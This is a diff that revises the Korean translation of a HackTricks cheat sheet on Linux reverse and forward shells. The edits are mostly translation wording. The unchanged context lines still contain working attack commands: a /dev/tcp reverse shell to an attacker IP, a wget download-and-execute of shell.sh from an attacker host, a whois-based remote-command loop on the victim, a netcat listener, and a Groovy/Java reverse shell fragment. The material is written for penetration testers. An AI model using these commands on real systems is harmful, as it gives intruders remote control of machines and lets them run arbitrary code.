@@ -1,21 +1,21 @@
 # Shells - Linux
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>HackTricks 지원하기</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
 
-**이 쉘에 대한 질문이 있으면** [**https://explainshell.com/**](https://explainshell.com) **를 확인할 수 있습니다.**
+**이 쉘에 대해 질문이 있으면** [**https://explainshell.com/**](https://explainshell.com) **를 확인하세요.**
 
 ## Full TTY
 
@@ -34,7 +34,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-다른 셸(sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash)도 확인하는 것을 잊지 마세요.
+다른 셸도 확인하는 것을 잊지 마세요: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, 및 bash.
 
 ### 기호 안전 셸
 ```bash
@@ -49,7 +49,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: 이 명령의 일부는 대화형(`-i`) Bash 셸을 시작합니다.
 2. **`>&`**: 이 명령의 일부는 **표준 출력**(`stdout`)과 **표준 오류**(`stderr`)를 **같은 목적지로 리디렉션하는** 약식 표기법입니다.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 이것은 **지정된 IP 주소와 포트에 대한 TCP 연결을 나타내는** 특수 파일입니다.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 이는 **지정된 IP 주소와 포트에 대한 TCP 연결을 나타내는** 특수 파일입니다.
 * **출력 및 오류 스트림을 이 파일로 리디렉션함으로써**, 명령은 대화형 셸 세션의 출력을 공격자의 머신으로 효과적으로 전송합니다.
 4. **`0>&1`**: 이 명령의 일부는 **표준 입력(`stdin`)을 표준 출력(`stdout`)과 같은 목적지로 리디렉션합니다**.
 
@@ -60,11 +60,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Linux 기반 웹 애플리케이션 내에서 **Remote Code Execution (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것이 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 보다 효과적으로 상호작용하기 위해 PTY (Pseudo Terminal) 셸을 설정하는 대안적 접근 방식이 필요합니다.
+Linux 기반 웹 애플리케이션 내에서 **원격 코드 실행 (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것이 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 보다 효과적으로 상호작용하기 위해 PTY (가상 터미널) 셸을 설정하는 대안적 접근 방식이 필요합니다.
 
-이 목적을 위해 추천되는 도구는 [toboggan](https://github.com/n3rada/toboggan.git)으로, 이는 대상 환경과의 상호작용을 단순화합니다.
+이 목적을 위해 추천되는 도구는 [toboggan](https://github.com/n3rada/toboggan.git)으로, 대상 환경과의 상호작용을 단순화합니다.
 
-toboggan을 효과적으로 사용하려면, 대상 시스템의 RCE 맥락에 맞춘 Python 모듈을 생성해야 합니다. 예를 들어, `nix.py`라는 모듈은 다음과 같이 구성될 수 있습니다:
+toboggan을 효과적으로 사용하려면, 대상 시스템의 RCE 맥락에 맞춘 Python 모듈을 생성하십시오. 예를 들어, `nix.py`라는 모듈은 다음과 같이 구성될 수 있습니다:
 ```python3
 import jwt
 import httpx
@@ -133,7 +133,7 @@ while true; do nc -l <port>; done
 ```
 명령을 보내려면 입력하고 Enter를 누른 다음 CTRL+D를 눌러 STDIN을 중지합니다.
 
-**Victim**
+**희생자**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -318,7 +318,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 주의: Java 리버스 셸은 Groovy에서도 작동합니다.
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 주의: Java 리버스 셸은 Groovy에도 작동합니다.
 ```bash
 String host="localhost";
 int port=8044;
@@ -342,7 +342,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
